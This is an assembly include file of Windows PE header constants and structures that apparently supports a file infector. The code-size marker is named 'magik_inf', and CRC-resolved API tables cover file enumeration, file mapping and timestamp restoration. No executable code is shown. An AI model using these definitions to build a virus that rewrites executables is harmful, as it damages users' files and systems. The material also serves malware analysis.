MAX_PATH                          equ     260
GMEM_ZEROINIT                     equ     40h
CREATE_ALWAYS                     equ     2
OPEN_EXISTING                     equ     3

FILE_READ_DATA                    equ     1
FILE_WRITE_DATA                   equ     2

FILE_ATTRIBUTE_DIRECTORY          equ     10h
FILE_ATTRIBUTE_ARCHIVE            equ     20h

FILE_MAP_WRITE                    equ     2

PAGE_READWRITE                    equ     4

IMAGE_FILE_MACHINE_I386           equ     14ch

IMAGE_FILE_EXECUTABLE_IMAGE       equ     2
IMAGE_FILE_32BIT_MACHINE          equ     100h

IMAGE_NT_OPTIONAL_HDR32_MAGIC     equ     10bh

IMAGE_FILE_SYSTEM                 equ     1000h
IMAGE_FILE_DLL                    equ     2000h

IMAGE_SUBSYSTEM_WINDOWS_GUI       equ     2
IMAGE_SUBSYSTEM_WINDOWS_CUI       equ     3

GuardCFCheckFunctionPointer       equ     48h
GuardCFFunctionTable              equ     50h
GuardFlags                        equ     58h 

IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE   equ 40h
IMAGE_DLLCHARACTERISTICS_NX_COMPAT      equ 100h
IMAGE_DLLCHARACTERISTICS_GUARD_CF       equ 4000h

IMAGE_SCN_MEM_EXECUTE             equ     20000000h
IMAGE_SCN_MEM_WRITE               equ     80000000h

IMAGE_GUARD_CF_INSTRUMENTED           equ     100h
IMAGE_GUARD_CF_FUNCTION_TABLE_PRESENT equ     400h

IMAGE_REL_BASED_HIGHLOW         equ     3

pebImageBase                    equ     8
pebLdr                          equ     0ch
ldrInLoadOrderModuleList        equ     0ch
mlDllBase                       equ     18h

CODESIZE                        equ     (magik_end - magik_inf)

SectionRVA                      equ     1000h
SectionSize                     equ     5000h
SectionCount                    equ     1
ImageBase                       equ     400000h
SectionAlignment                equ     1000h
FileAlignment                   equ     200h

struc   dllcrcstk
        .dWriteFile:    resd 1
        .dGlobalFree:   resd 1
        .dGlobalAlloc:  resd 1
        .dGetTickCount: resd 1
        .dCreateFileA:  resd 1
        .dCloseHandle:  resd 1
endstruc

struc   krncrcstk
        .kUnmapViewOfFile:    resd 1
        .kSetFileTime:        resd 1
        .kSetFilePointer:     resd 1
        .kSetFileAttributesW: resd 1
        .kSetEndOfFile:       resd 1
        .kMapViewOfFile:      resd 1
        .kFindNextFileW:      resd 1
        .kFindFirstFileW:     resd 1
        .kFindClose:          resd 1
        .kExitProcess:        resd 1
        .kCreateFileW:        resd 1
        .kCreateFileMappingW: resd 1
        .kCloseHandle:        resd 1
endstruc

struc   FILETIME
        .dwLowDateTime :resd    1
        .dwHighDateTime:resd    1
endstruc

struc   WIN32_FIND_DATA
        .dwFileAttributes  :    resd    1
        .ftCreationTime    :    resb    FILETIME_size
        .ftLastAccessTime  :    resb    FILETIME_size
        .ftLastWriteTime   :    resb    FILETIME_size
        .dwFileSizeHigh    :    resd    1
        .dwFileSizeLow     :    resd    1
        .dwReserved0       :    resd    1
        .dwReserved1       :    resd    1
        .cFileName         :    resw    260
        .cAlternateFileName:    resw    14
endstruc

struc   mzhdr
        .mzsig     :    resw    1               ;00
        .mzpagemod :    resw    1               ;02
        .mzpagediv :    resw    1               ;04
        .mzrelocs  :    resw    1               ;06
        .mzhdrsize :    resw    1               ;08
        .mzminalloc:    resw    1               ;0A
        .mzmaxalloc:    resw    1               ;0C
        .mzss      :    resw    1               ;0E
        .mzsp      :    resw    1               ;10
        .mzchksum  :    resw    1               ;12
        .mzip      :    resw    1               ;14
        .mzcs      :    resw    1               ;16
        .mzreloff  :    resw    1               ;18
        .mzfiller  :    resb    22h             ;1A
        .mzlfanew  :    resd    1               ;3C
endstruc

struc   coffhdr
        .pemachine   :  resw    1               ;04
        .pesectcount :  resw    1               ;06
        .petimedate  :  resd    1               ;08
        .pesymbrva   :  resd    1               ;0C
        .pesymbcount :  resd    1               ;10
        .peopthdrsize:  resw    1               ;14
        .peflags     :  resw    1               ;16
endstruc

struc   pedir
        .dirrva :       resd    1
        .dirsize:       resd    1
endstruc

struc   pehdr
        .pesig        : resd    1               ;000
        .pecoff       : resb    coffhdr_size
        .pemagic      : resw    1               ;018
        .pemajorlink  : resb    1               ;01A
        .peminorlink  : resb    1               ;01B
        .pecodesize   : resd    1               ;01C
        .peidatasize  : resd    1               ;020
        .peudatasize  : resd    1               ;024
        .peentrypoint : resd    1               ;028
        .pecodebase   : resd    1               ;02C
        .pedatabase   : resd    1
        .peimagebase  : resd    1               ;030
        .pesectalign  : resd    1               ;038
        .pefilealign  : resd    1               ;03C
        .pemajoros    : resw    1               ;040
        .peminoros    : resw    1               ;042
        .pemajorimage : resw    1               ;044
        .peminorimage : resw    1               ;046
        .pemajorsubsys: resw    1               ;048
        .peminorsubsys: resw    1               ;04A
        .pereserved   : resd    1               ;04C
        .peimagesize  : resd    1               ;050
        .pehdrsize    : resd    1               ;054
        .pechksum     : resd    1               ;058
        .pesubsys     : resw    1               ;05C
        .pedllflags   : resw    1               ;05E
        .pestackmax   : resd    1               ;060
        .pestacksize  : resd    1               ;068
        .peheapmax    : resd    1               ;070
        .peheapsize   : resd    1               ;078
        .peldrflags   : resd    1               ;080
        .pervacount   : resd    1               ;084
        .peexport     : resb    pedir_size      ;088
        .peimport     : resb    pedir_size      ;090
        .persrc       : resb    pedir_size      ;098
        .peexcpt      : resb    pedir_size      ;0A0
        .pesecurity   : resb    pedir_size      ;0A8
        .pereloc      : resb    pedir_size      ;0B0
        .pedebug      : resb    pedir_size      ;0B8
        .pearch       : resb    pedir_size      ;0C0
        .peglobal     : resb    pedir_size      ;0C8
        .petls        : resb    pedir_size      ;0D0
        .peconfig     : resb    pedir_size      ;0D8
        .pebound      : resb    pedir_size      ;0E0
        .peiat        : resb    pedir_size      ;0E8
        .pedelay      : resb    pedir_size      ;0F0
        .pecom        : resb    pedir_size      ;0F8
        .persrv       : resb    pedir_size
endstruc

struc   peexp
        .expflags    :  resd    1
        .expdatetime :  resd    1
        .expmajorver :  resw    1
        .expminorver :  resw    1
        .expdllrva   :  resd    1
        .expordbase  :  resd    1
        .expadrcount :  resd    1
        .expnamecount:  resd    1
        .expadrrva   :  resd    1
        .expnamerva  :  resd    1
        .expordrva   :  resd    1
endstruc

struc   pesect
        .sectname     : resb    8
        .sectvirtsize : resd    1
        .sectvirtaddr : resd    1
        .sectrawsize  : resd    1
        .sectrawaddr  : resd    1
        .sectreladdr  : resd    1
        .sectlineaddr : resd    1
        .sectrelcount : resw    1
        .sectlinecount: resw    1
        .sectflags    : resd    1
endstruc                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      